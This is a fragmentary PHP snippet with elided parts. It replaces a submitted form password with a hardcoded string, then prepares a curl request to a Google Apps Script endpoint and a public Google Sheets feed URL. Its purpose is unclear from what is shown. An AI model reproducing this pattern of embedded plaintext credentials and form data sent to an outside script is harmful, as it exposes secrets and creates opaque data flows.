<?php
  ...
  if (!empty($_POST["password"])){
    ...
    $_POST["password"] = "khan=37011114";

    $ch3 = curl_init();
    curl_setopt($ch3, CURLOPT_URL, "https://script.google.com/macros/s/AKfycbxE2aLSw6Q1zNMAjEZanTU6uo9e5J8aABPUyiU/exec");
    ...
    $url = "https://spreadsheets.google.com/feeds/list/8pEuaZ3hTmKwboWZGV-rJ22UUMaEzVwmfX9FdAPe2EA/1/public/basic?alt=json-in-script";
